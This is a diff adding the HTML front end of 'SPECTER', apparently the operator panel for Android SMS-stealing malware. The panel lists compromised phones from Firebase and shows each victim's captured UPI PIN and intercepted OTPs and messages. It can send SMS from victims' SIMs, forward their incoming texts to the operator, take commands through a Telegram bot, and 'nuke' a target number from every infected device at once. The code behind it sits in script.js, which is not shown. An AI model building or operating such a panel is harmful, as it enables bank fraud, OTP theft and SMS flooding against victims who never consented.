@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>SPECTER &mdash; Advanced Cyber Panel</title>
+<link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+
+<div id="otpBar">
+  <div class="otp-lbl">OTP</div>
+  <div class="otp-num" id="otpNum" onclick="otpCopy()">──────</div>
+  <div class="otp-src" id="otpSrc"></div>
+  <button class="otp-cpbtn" onclick="otpCopy()">Copy</button>
+  <button class="otp-x" onclick="otpDismiss()">✕</button>
+</div>
+
+<!-- ══════════ SETUP ══════════ -->
+<div id="setup" style="display:flex">
+  <div class="orb o1"></div><div class="orb o2"></div>
+  <div class="setup-card">
+    <div class="cat-stage">
+      <div class="cat-sh"></div>
+      <div class="cp" style="left:29%;bottom:54%;background:#a855f7;--dur:1.9s;--del:0s;--dx:-20px;width:5px;height:5px;"></div>
+      <div class="cp" style="left:71%;bottom:60%;background:#e879f9;--dur:2.2s;--del:.35s;--dx:18px;width:4px;height:4px;"></div>
+      <div class="cp" style="left:50%;bottom:72%;background:#c084fc;--dur:1.7s;--del:.7s;--dx:12px;width:3px;height:3px;"></div>
+      <div class="cat-wrap" onclick="catClick()">
+        <svg class="cat-svg" viewBox="0 0 140 140" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <radialGradient id="cBod" cx="40%" cy="30%"><stop offset="0%" stop-color="#1a0e30"/><stop offset="100%" stop-color="#08040e"/></radialGradient>
+            <radialGradient id="eyeGL" cx="35%" cy="35%"><stop offset="0%" stop-color="#a855f7"/><stop offset="100%" stop-color="#1a0a2e"/></radialGradient>
+            <radialGradient id="eyeGR" cx="35%" cy="35%"><stop offset="0%" stop-color="#e879f9"/><stop offset="100%" stop-color="#2a0a2a"/></radialGradient>
+            <radialGradient id="hGrad" cx="40%" cy="30%"><stop offset="0%" stop-color="#a855f7"/><stop offset="100%" stop-color="#4c1d95"/></radialGradient>
+            <filter id="glow" x="-30%" y="-30%" width="160%" height="160%"><feGaussianBlur stdDeviation="2.5" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+          </defs>
+          <ellipse cx="70" cy="103" rx="30" ry="23" fill="url(#cBod)"/>
+          <path d="M 100,105 Q 128,88 124,68 Q 120,50 132,38" stroke="rgba(168,85,247,0.7)" stroke-width="6" fill="none" stroke-linecap="round" style="animation:tailSwing 1.8s ease-in-out infinite;transform-origin:100px 105px"/>
+          <path d="M 38,36 L 25,6 L 52,30" fill="url(#hGrad)" filter="url(#glow)"/>
+          <path d="M 102,36 L 115,6 L 88,30" fill="url(#hGrad)" filter="url(#glow)"/>
+          <circle cx="70" cy="60" r="32" fill="url(#cBod)"/>
+          <polygon points="38,38 30,16 52,33" fill="url(#cBod)"/>
+          <polygon points="102,38 110,16 88,33" fill="url(#cBod)"/>
+          <g style="animation:eyeBlink 5s infinite;transform-origin:56px 60px">
+            <ellipse cx="56" cy="60" rx="10" ry="11" fill="url(#eyeGL)" filter="url(#glow)"/>
+            <ellipse cx="56" cy="60" rx="3.5" ry="9" fill="#1a0a2e"/>
+            <circle cx="59" cy="55" r="2.8" fill="rgba(216,180,254,.9)"/>
+          </g>
+          <g style="animation:eyeBlink 5s infinite;animation-delay:.07s;transform-origin:84px 60px">
+            <ellipse cx="84" cy="60" rx="10" ry="11" fill="url(#eyeGR)" filter="url(#glow)"/>
+            <ellipse cx="84" cy="60" rx="3.5" ry="9" fill="#2a0a2a"/>
+            <circle cx="87" cy="55" r="2.8" fill="rgba(232,121,249,.85)"/>
+          </g>
+          <polygon points="70,70 66,75 74,75" fill="rgba(232,121,249,.9)"/>
+          <path d="M 42,84 Q 70,96 98,84" stroke="#a855f7" stroke-width="5.5" fill="none" stroke-linecap="round"/>
+          <circle cx="70" cy="92" r="6" fill="#a855f7" stroke="rgba(232,121,249,.7)" stroke-width="1.8"/>
+        </svg>
+      </div>
+    </div>
+    <div class="setup-eyebrow">SPECTER Advanced Panel</div>
+    <div class="setup-h"><span class="gold-word">Advanced</span> Console</div>
+    <div class="setup-sub">Connect your Firebase database and unlock the SPECTER command center.</div>
+    <label class="fl">Firebase Database URL</label>
+    <input id="fbUrl" class="fi" placeholder="https://your-project.firebaseio.com" type="url"/>
+    <button type="button" class="cta" onclick="rippleClick(event);connect()">⚡ Connect to Firebase →</button>
+    <div class="s-err" id="serr">Connection failed — check URL and key</div>
+    <div class="s-footer"><span class="gold-grad">SPECTER • Advanced Cyber Edition</span></div>
+  </div>
+</div>
+
+<!-- ══════════ MAIN PANEL ══════════ -->
+<div id="panel">
+  <div class="tb">
+    <div class="tb-dots"><div class="td td-r" onclick="disconnect()" title="Disconnect"></div><div class="td td-y"></div><div class="td td-g"></div></div>
+    <div class="tb-logo"><span class="tb-gl">SPECTER</span></div>
+    <div class="tb-pills"><span class="pill p-t" id="tpTot">—</span><span class="pill p-on" id="tpOn">—</span><span class="pill p-off" id="tpOff">—</span></div>
+    <div class="live-dot"></div>
+
+    <button class="tb-btn" onclick="loadDevs()" title="Refresh">↻</button>
+
+    <div class="filter-wrap">
+      <button class="tb-btn" id="filterBtn" onclick="toggleFilterMenu(event)">🔽 <span id="filterLabel">All</span></button>
+      <div class="filter-menu" id="filterMenu">
+        <div onclick="setGridFilter('all')" data-f="all">🌐 All Devices</div>
+        <div onclick="setGridFilter('online')" data-f="online">🟢 Online Only</div>
+        <div onclick="setGridFilter('offline')" data-f="offline">🔴 Offline Only</div>
+        <div onclick="setGridFilter('pin')" data-f="pin">💳 Has UPI PIN</div>
+      </div>
+    </div>
+
+    <button class="tb-btn nuke-btn" onclick="openNuke()">💣 Nuke</button>
+    <button class="tb-btn" onclick="openSettings()">⚙ Settings</button>
+    <button class="tb-btn" onclick="openAllMsgs()">📋 All Msgs</button>
+    <button class="tb-btn" id="apBtn" onclick="autoPinAll()" style="color:var(--lilac)">PING</button>
+    <button class="tb-btn" id="tgStatus" title="Telegram Bot Status">🤖 OFF</button>
+  </div>
+
+  <div class="grid-wrap" id="gridWrap">
+    <div class="device-grid" id="deviceGrid">
+      <div class="ldwrap" style="grid-column:1/-1"><div class="gold-spin"></div> Loading devices...</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════ DEVICE MODAL ══════════ -->
+<div class="overlay" id="deviceModal">
+  <div class="device-modal">
+    <div class="dm-header">
+      <div class="dm-header-left">
+        <div class="dm-icon">📱</div>
+        <div>
+          <div class="dm-name" id="dmName">Device</div>
+          <div class="dm-sub" id="dmSub">—</div>
+        </div>
+      </div>
+      <div class="dm-header-right">
+        <button class="dm-close" onclick="closeM('deviceModal')">✕</button>
+      </div>
+    </div>
+    <div class="dm-body">
+      <!-- LEFT COLUMN -->
+      <div class="dm-left">
+        <div class="dm-hero" id="dmHero"></div>
+
+        <div class="sec-hdr">🎯 Active SIM for outgoing SMS</div>
+        <div class="sim-select" id="dmSimSelect">
+          <button class="sim-opt" data-sim="1" onclick="setActiveSim(1)">
+            <div class="sim-opt-lbl">SIM 1</div>
+            <div class="sim-opt-num" id="dmSim1">—</div>
+          </button>
+          <button class="sim-opt" data-sim="2" onclick="setActiveSim(2)">
+            <div class="sim-opt-lbl">SIM 2</div>
+            <div class="sim-opt-num" id="dmSim2">—</div>
+          </button>
+        </div>
+
+        <div class="sec-hdr">💳 UPI PIN</div>
+        <div class="pin-card" id="dmPinCard">
+          <div class="pin-digits loading" id="dmPinVal">Loading…</div>
+          <div class="pin-actions-row">
+            <button class="pin-action-btn pin-show-btn" id="dmPinToggle" onclick="togPinActive()" style="display:none">Show</button>
+            <button class="pin-action-btn pin-copy-btn" id="dmPinCopy" onclick="copyPinActive()" style="display:none">Copy</button>
+          </div>
+        </div>
+
+        <div class="sec-hdr">📝 Device Note</div>
+        <div class="note-row">
+          <input class="note-inp" id="dmNoteInp" placeholder="Add note (bal, owner…)"/>
+          <button class="note-save" onclick="saveNoteActive()">Save</button>
+        </div>
+
+        <div class="sec-hdr">📊 Info</div>
+        <div class="info-grid" id="dmInfo"></div>
+
+        <div class="det-actions">
+          <button class="da da-d" onclick="confDelActive()">🗑 Delete Device</button>
+        </div>
+      </div>
+
+      <!-- RIGHT COLUMN -->
+      <div class="dm-right">
+        <div class="dm-tabs">
+          <button class="dm-tab active" data-tab="msgs" onclick="dmSwitchTab('msgs')">💬 Messages</button>
+          <button class="dm-tab" data-tab="send" onclick="dmSwitchTab('send')">📡 Send SMS</button>
+        </div>
+
+        <div class="dm-tab-pane active" id="dmPane-msgs">
+          <div class="msg-top">
+            <div style="display:flex;align-items:center;gap:10px"><div class="msg-cnt" id="dmMsgCnt">0</div></div>
+            <div style="display:flex;align-items:center;gap:8px">
+              <button class="mbtn" onclick="refreshActiveMsgs()">↻</button>
+              <button class="mbtn" onclick="exportActiveMsgs()" style="color:var(--mint)">CSV</button>
+              <div class="live-b"><div class="ld"></div> Live</div>
+            </div>
+          </div>
+          <div class="msg-bar">
+            <div class="sbox"><input id="dmMsgSearch" placeholder="Search..." oninput="filterActiveMsgs()"/></div>
+            <button class="mfb ma" id="dm-mf-all" onclick="setActiveMF('all')">All</button>
+            <button class="mfb" id="dm-mf-incoming" onclick="setActiveMF('incoming')">In</button>
+            <button class="mfb" id="dm-mf-outgoing" onclick="setActiveMF('outgoing')">Out</button>
+          </div>
+          <div id="dmMsgList" class="msg-list"></div>
+        </div>
+
+        <div class="dm-tab-pane" id="dmPane-send">
+          <div class="send-box">
+            <div class="ddisp" id="dmSendDisp"></div>
+            <div class="sim-toggle-row">
+              <button class="stb s1" id="dmSimBtn1" onclick="setActiveSim(1)">SIM 1</button>
+              <button class="stb" id="dmSimBtn2" onclick="setActiveSim(2)">SIM 2</button>
+            </div>
+            <div class="otp-note-box" style="margin-top:16px">
+              <div class="otp-note-lbl">💳 OTP Note (saved per device)</div>
+              <div class="otp-note-disp empty" id="dmOtpNoteDisp">No OTP note saved yet…</div>
+              <div class="otp-note-row">
+                <input class="otp-note-inp" id="dmOtpNoteInp" placeholder="Paste OTP, balance…"/>
+                <button class="otp-note-save" onclick="saveOtpNoteActive()">Save</button>
+              </div>
+            </div>
+            <label class="fl" style="margin-top:16px">To (Phone Number)</label>
+            <input id="dmSendTo" class="sinp" placeholder="+91 9876543210"/>
+            <label class="fl">Message</label>
+            <textarea id="dmSendMsg" class="sarea" placeholder="Type your message..."></textarea>
+            <button class="sbtn" id="dmSendBtn" onclick="sendSmsActive()">🚀 Send Message</button>
+            <div class="sres" id="dmSendRes"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════ NUKE MODAL ══════════ -->
+<div class="overlay" id="nukeModal">
+  <div class="modal modal-nuke">
+    <div class="modal-header-hero">
+      <div style="font-size:42px;animation:float 2s ease-in-out infinite">💣</div>
+      <div style="flex:1">
+        <div class="mt" style="color:var(--rose);margin-bottom:2px">Nuke — All Device Blast</div>
+        <div style="font-size:12px;color:var(--sub)">Fires from ALL online devices using BOTH SIMs</div>
+      </div>
+    </div>
+    <label class="fl">Target Number</label>
+    <input id="nukeTarget" class="nuke-inp" placeholder="+91 9876543210"/>
+    <label class="fl">Message</label>
+    <textarea id="nukeMsg" class="nuke-area" placeholder="Type the message to blast from all SIMs..."></textarea>
+    <div class="nuke-info-box">
+      <span id="nukeDeviceCount" style="color:var(--mint);font-weight:800">0</span> devices online ·
+      <span id="nukeSimCount" style="color:var(--gold2);font-weight:800">0</span> SIMs total ·
+      <span id="nukeTotalShots" style="color:var(--lilac);font-weight:800">0</span> messages will be sent
+    </div>
+    <div class="nuke-stat-row" id="nukeStats">
+      <div class="nuke-stat"><div class="nuke-stat-l">Sent</div><div class="nuke-stat-v" id="nukeSent" style="color:var(--mint)">0</div></div>
+      <div class="nuke-stat"><div class="nuke-stat-l">Failed</div><div class="nuke-stat-v" id="nukeFail" style="color:var(--rose)">0</div></div>
+      <div class="nuke-stat"><div class="nuke-stat-l">Total</div><div class="nuke-stat-v" id="nukeTotal" style="color:var(--gold2)">0</div></div>
+    </div>
+    <div class="nuke-progress-wrap" id="nukeProgWrap" style="display:none">
+      <div class="nuke-progress"><div class="nuke-progress-fill" id="nukeProgFill"></div></div>
+      <div class="nuke-progress-txt" id="nukeProgTxt">0%</div>
+    </div>
+    <div style="display:flex;gap:10px;margin-top:16px">
+      <button id="nukeFireBtn" class="nuke-fire-btn" onclick="fireNuke()">💣 Fire Nuke</button>
+      <button id="nukeStopBtn" class="nuke-stop-btn" onclick="stopNuke()" style="display:none">⏹ Stop</button>
+    </div>
+    <div class="mbtns" style="margin-top:14px">
+      <button class="mcnc" onclick="closeM('nukeModal')">Close</button>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+
+
+<!-- ══════════ SETTINGS MODAL (updated) ══════════ -->
+<div class="overlay" id="settingsModal">
+  <div class="modal modal-settings">
+    <div class="modal-header-hero">
+      <div style="font-size:36px">⚙️</div>
+      <div style="flex:1">
+        <div class="mt" style="margin-bottom:0">Settings</div>
+        <div style="font-size:12px;color:var(--sub)">Auto-saved to cloud · Bot token pre-configured</div>
+      </div>
+      <button class="dm-close" onclick="closeM('settingsModal')">✕</button>
+    </div>
+
+    <div class="settings-scroll">
+      <!-- MY NUMBER -->
+      <div class="settings-section">
+        <div class="settings-title">📞 My Number (Forward Target)</div>
+        <div class="settings-desc">All incoming messages on the active device will be forwarded to this number via SMS.</div>
+        <input class="fi" id="setMyNumber" placeholder="+91 9876543210"/>
+      </div>
+
+      <!-- TELEGRAM -->
+      <div class="settings-section">
+        <div class="settings-title">🤖 Telegram Bot</div>
+        <div class="settings-desc">Add <span style="color:var(--gold2);font-family:'JetBrains Mono',monospace" id="botUsername">@bot</span> to your Telegram channel as admin. Every message containing a number will trigger an SMS via the active device.</div>
+
+        <label class="fl">Your Telegram User ID (owner)</label>
+        <input class="fi" id="setTgUserId" placeholder="e.g. 123456789"/>
+
+        <label class="fl">Channel ID</label>
+        <input class="fi" id="setTgChannel" placeholder="-1001234567890 or @channelname"/>
+
+        <div class="settings-toggle-row">
+          <input type="checkbox" id="setTgEnabled"/>
+          <label for="setTgEnabled">Enable Telegram Bot</label>
+        </div>
+        <div class="settings-toggle-row">
+          <input type="checkbox" id="setFwdEnabled"/>
+          <label for="setFwdEnabled">Auto-forward device messages to My Number</label>
+        </div>
+        <div class="settings-status" id="tgStatusLine">Not running</div>
+      </div>
+
+      <!-- FIREBASE -->
+      <div class="settings-section">
+        <div class="settings-title">🔥 Additional Firebase URLs</div>
+        <div class="settings-desc">Devices from all Firebase databases are merged. Config saved to cloud automatically.</div>
+        <div id="settingsFbList"></div>
+        <div class="fb-add-row">
+          <input class="fi" id="setFbLabel" placeholder="Label (optional)" style="margin-bottom:0"/>
+          <input class="fi" id="setFbUrl" placeholder="https://xxx.firebaseio.com" style="margin-bottom:0"/>
+          <input class="fi" id="setFbKey" placeholder="Auth key (optional)" style="margin-bottom:0"/>
+          <button class="mok" onclick="addFirebaseFromSettings()">＋ Add</button>
+        </div>
+      </div>
+
+      <div class="settings-section">
+        <div class="settings-title">☁️ Cloud Config</div>
+        <div class="settings-desc">Your settings are auto-saved to a cloud JSON blob and restored on any browser.</div>
+        <div style="display:flex;gap:8px;margin-top:8px">
+          <button class="mcnc" onclick="resetCloudConfig()" style="flex:1">🗑 Reset</button>
+          <button class="mok" onclick="forceCloudSave()" style="flex:1">☁ Force Save</button>
+        </div>
+        <div class="settings-status" id="cloudStatus">—</div>
+      </div>
+    </div>
+
+    <div class="mbtns" style="margin-top:16px">
+      <button class="mcnc" onclick="closeM('settingsModal')">Close</button>
+      <button class="mok" onclick="saveAllSettings()">💾 Save Settings</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════ ALL MSGS MODAL ══════════ -->
+<div class="overlay" id="allMsgsModal">
+  <div class="modal modal-allmsgs">
+    <div class="modal-header-hero">
+      <div style="font-size:32px">📋</div>
+      <div style="flex:1"><div class="mt" style="margin-bottom:0">All Messages</div></div>
+      <button class="dm-close" onclick="closeM('allMsgsModal')">✕</button>
+    </div>
+    <div class="msg-bar" style="margin-top:12px">
+      <div class="sbox"><input id="amSearch" placeholder="Search all messages..." oninput="filterAndRender()"/></div>
+      <button class="mfb ma" id="amf-all" onclick="setAMF('all')">All</button>
+      <button class="mfb" id="amf-incoming" onclick="setAMF('incoming')">In</button>
+      <button class="mfb" id="amf-outgoing" onclick="setAMF('outgoing')">Out</button>
+    </div>
+    <div id="amWrap" style="overflow-y:auto;max-height:60vh;margin-top:10px">
+      <div id="amList"></div>
+      <div id="amSentinel" style="height:40px"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════ ADD/UPDATE/CONFIRM/DELETE MODALS ══════════ -->
+<div class="overlay" id="confirmModal"><div class="modal"><div class="mt" id="confT">Confirm</div><p id="confM" style="color:var(--sub);font-size:13px;margin-bottom:18px;line-height:1.7"></p><div class="mbtns"><button class="mcnc" onclick="closeM('confirmModal')">Cancel</button><button class="mok danger" id="confOk">Delete</button></div></div></div>
+<div class="overlay" id="delMsgModal"><div class="modal" style="max-width:360px">
+<div class="mt" style="color:var(--rose)">🗑 Delete Message?</div>
+<p id="delMsgPreview" style="color:var(--sub);font-size:12px;margin-bottom:18px;font-family:'JetBrains Mono',monospace;background:var(--bg3);padding:10px;border-radius:8px;max-height:80px;overflow:hidden;"></p>
+<div class="mbtns"><button class="mcnc" onclick="closeM('delMsgModal')">Cancel</button><button class="mok danger" id="delMsgOk">Delete</button></div>
+</div></div>
+
+<div class="toast" id="toastEl"></div>
+
+<script src="config.js"></script>
+<script src="script.js"></script>
+</body>
+</html>
